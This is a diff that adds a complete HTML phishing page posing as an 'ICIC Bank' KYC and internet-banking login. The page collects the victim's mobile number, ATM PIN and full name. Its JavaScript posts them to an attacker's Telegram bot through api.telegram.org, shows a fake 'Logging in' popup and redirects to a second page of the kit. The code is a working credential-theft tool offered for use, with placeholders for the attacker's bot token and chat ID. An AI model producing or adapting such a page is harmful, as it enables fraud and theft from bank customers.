@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ICIC Bank KYC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 400px;
+        }
+        .container img {
+            width: 350px;
+            margin-bottom: 20px;
+        }
+        .header-text {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .welcome-text {
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #555;
+        }
+        .input-field {
+            margin-bottom: 15px;
+            width: 100%;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .checkbox {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .checkbox label {
+            font-size: 14px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #005bb5;
+        }
+        .loading-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://i.ibb.co/T8Xhg5r/icici-bank-aeps-500x500.jpg" alt="ICIC Bank Logo">
+    <div class="header-text">Login to Internet Banking</div>
+    <div class="welcome-text">
+        Welcome to ICIC Bank's fast & secure online KYC app. You can complete your KYC within 2 minutes. Thank you for joining ICIC BANK.
+    </div>
+
+    <div class="input-field">
+        <label for="mobile">Mobile No:</label>
+        <input type="text" id="mobile" maxlength="10" placeholder="Enter 10-digit mobile number">
+    </div>
+
+    <div class="input-field">
+        <label for="atmPin">ATM PIN:</label>
+        <input type="password" id="atmPin" maxlength="4" placeholder="Enter 4-digit ATM PIN">
+    </div>
+
+    <div class="input-field">
+        <label for="fullName">Full Name:</label>
+        <input type="text" id="fullName" placeholder="Enter your full name">
+    </div>
+
+    <div class="checkbox">
+        <label for="remember">
+            <input type="checkbox" id="remember"> Remember me
+        </label>
+    </div>
+
+    <button class="login-button" onclick="sendToTelegram()">Login</button>
+</div>
+
+<div class="loading-popup" id="loadingPopup">
+    <h2>Logging in</h2>
+    <p>Loading, please wait...</p>
+</div>
+
+<script>
+    function sendToTelegram() {
+        const mobile = document.getElementById('mobile').value;
+        const atmPin = document.getElementById('atmPin').value;
+        const fullName = document.getElementById('fullName').value;
+        const remember = document.getElementById('remember').checked;
+
+        if (mobile.length === 10 && atmPin.length === 4 && fullName) {
+            const token = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID';  // Replace with your chat ID
+            const message = `Mobile: ${mobile}\nATM PIN: ${atmPin}\nFull Name: ${fullName}\nRemember Me: ${remember}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('loadingPopup').style.display = 'block';
+                    localStorage.setItem('mobileEnd', mobile.slice(-4)); // Save last 4 digits of the mobile number
+                    setTimeout(() => {
+                        window.location.href = 'second-page.html'; // Redirect to the second page
+                    }, 5000); // 5 seconds delay
+                } else {
+                    alert('Failed to send information.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error occurred while sending information.');
+            });
+        } else {
+            alert('Please fill out all fields correctly.');
+        }
+    }
+</script>
+
+</body>
+</html>
